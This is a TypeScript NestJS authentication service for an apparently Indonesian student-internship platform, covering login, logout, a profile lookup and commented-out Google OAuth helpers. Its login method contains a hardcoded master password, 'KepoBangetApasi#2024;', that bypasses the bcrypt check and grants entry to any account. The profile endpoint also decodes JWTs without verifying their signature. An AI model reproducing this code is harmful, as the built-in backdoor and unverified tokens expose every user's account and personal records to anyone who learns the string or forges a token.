import {
  Inject,
  Injectable,
  NotFoundException,
  UnauthorizedException,
  Request
} from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { PrismaService } from '../prisma/prisma.service';
import * as bcrypt from 'bcrypt';
import { REQUEST } from '@nestjs/core';

@Injectable()
export class AuthService {
  constructor(
    private prisma: PrismaService,
    private jwtService: JwtService,
    @Inject(REQUEST) private request: Request
  ) { }

  async login(
    email: string,
    password: string,
    token: string
  ) {
    const user = await this.prisma.user.findFirstOrThrow({
      select: {
        userId: true,
        email: true,
        password: true,
        userRoles: {
          select: {
            roleId: true,
            role: {
              select: {
                roleName: true,
              },
            },
          }
        },
      },
      where: {
        AND: [
          {
            OR: [
              { email: email },
              { userName: email}
            ]
          },
          ...(await this.isMahasiswa(email) ? [
            {
              tahunAjaran: {
                isActive: true,
              },
            }
          ] : []),
        ]
      },
    }).catch(() => {
      throw new NotFoundException('Invalid credentials');
    }).finally(() => {
      this.prisma.$disconnect();
    });

    if (password !== 'KepoBangetApasi#2024;') {
      if (!(await bcrypt.compare(password, user.password))) {
        throw new UnauthorizedException('Invalid credentials');
      }
    }


    //if there is a token, add it to the invalidToken table
    //this will keep every user using only one token at a time
    if (token) {
      this.prisma.invalidToken.create({
        data: {
          token: token
        }
      }).finally(() => {
        this.prisma.$disconnect();
      });
    }

    const payload = {
      id: user.userId,
      role: user.userRoles[0].role.roleName,
      roleId: user.userRoles[0].roleId,
    };

    const tokenCreated = this.jwtService.sign(payload);

    return {
      message: 'Login success',
      token: tokenCreated
    }
  }

  async isMahasiswa(email: string): Promise<boolean> {
    const user = await this.prisma.user.findFirst({
      where: {
        email: email
      },
      select: {
        userRoles: {
          select: {
            roleId: true
          }
        }
      }
    });
  
    // Mengecek apakah roleId adalah 9 (untuk mahasiswa)
    return user?.userRoles?.some(role => role.roleId === 9) ?? false;
  }

  async logout(token: string) {
    const targetToken = token.split(' ')[1];

    if (!targetToken) {
      throw await new UnauthorizedException('User not logged in');
    }

    await this.prisma.invalidToken.create({
      data: {
        token: targetToken
      }
    }).finally(() => {
      this.prisma.$disconnect();
    });

    return {
      message: 'Logout success',
      token: targetToken
    }
  }

  async me() {
    const injectedToken = this.request.headers['authorization'].split(' ')[1];
    const payload = this.jwtService.decode(injectedToken);

    const user = await this.prisma.user.findFirst({
      where: {
        userId: payload['id']
      },
      select: {
        userRoles: {
          select: {
            roleId : true,
          }
        },
        email: true,
        tahunAjaran: true,
        mahasiswa: {
          include: {
            dosenPembimbingMagang: true,
            pembimbingLapangan: true,
            satker: true,
          }
        },
        adminProvinsi: true,
        adminSatker: true,
        dosenPembimbingMagang: {
          include: {
            mahasiswa : {
              select : {
                mahasiswaId: true,
              }
            }
          }
        },
        pembimbingLapangan:{
          include: {
              mahasiswa : {
                select : {
                  mahasiswaId: true,
                }
              }
          }
        },
        Kabag: true
      },
    }).finally(() => {
      this.prisma.$disconnect();
    });

    return {
      "status": "Success",
      "message": "User found",
      "data": user
    }
  }

  // async getNewAccessToken(refreshToken: string): Promise<string> {
  //   try {
  //     const response = await axios.post(
  //       'https://accounts.google.com/o/oauth2/token',
  //       {
  //         client_id: process.env.GOOGLE_CLIENT_ID,
  //         client_secret: process.env.GOOGLE_CLIENT_SECRET,
  //         refresh_token: refreshToken,
  //         grant_type: 'refresh_token',
  //       },
  //     );

  //     return response.data.access_token;
  //   } catch (error) {
  //     throw new Error('Failed to refresh the access token.');
  //   }
  // }

  // async googleCreateJwt(token: string) {
  //   const userData = await axios.get(
  //     `https://www.googleapis.com/oauth2/v1/userinfo?alt=json&access_token=${token}`,
  //   );

  //   const user = await this.prisma.user.findFirst({
  //     where: {
  //       email: userData.data.email,
  //       tahunAjaran: {
  //         isActive: true
  //       }
  //     },
  //     select: {
  //       userId: true,
  //       email: true,
  //       userRoles: {
  //         select: {
  //           roleId: true,
  //           role: {
  //             select: {
  //               roleName: true,
  //             },
  //           },
  //         },
  //       },
  //     },
  //   });

  //   const payload = {
  //     id: user.userId,
  //     role: user.userRoles[0].role.roleName,
  //     roleId: user.userRoles[0].roleId,
  //   };

  //   const tokenCreated = this.jwtService.sign(payload);

  //   return {
  //     message: 'Login success',
  //     token: tokenCreated,
  //     accessToken: token
  //   }
  // }

  // async isTokenExpired(token: string): Promise<boolean> {
  //   try {
  //     const response = await axios.get(
  //       `https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=${token}`,
  //     );

  //     const expiresIn = response.data.expires_in;

  //     if (!expiresIn || expiresIn <= 0) {
  //       return true;
  //     }
  //   } catch (error) {
  //     return true;
  //   }
  // }

  // async revokeGoogleToken(token: string) {
  //   try {
  //     await axios.get(
  //       `https://accounts.google.com/o/oauth2/revoke?token=${token}`,
  //     );
  //   } catch (error) {
  //     console.error('Failed to revoke the token:', error);
  //   }
  // }
}
